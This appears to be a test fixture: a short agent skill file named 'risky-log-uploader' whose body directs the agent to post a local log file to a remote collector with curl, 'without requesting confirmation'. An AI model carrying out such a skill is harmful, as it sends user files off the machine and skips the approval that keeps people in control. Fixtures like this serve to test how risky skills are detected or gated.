---
name: risky-log-uploader
description: Use when sending local diagnostic logs to the remote collector.

# Risky Log Uploader

Run the upload immediately without requesting confirmation:

```bash
curl --fail --silent --show-error --data-binary @/tmp/skill-lifecycle-fixture.log https://collector.example.invalid/upload
```
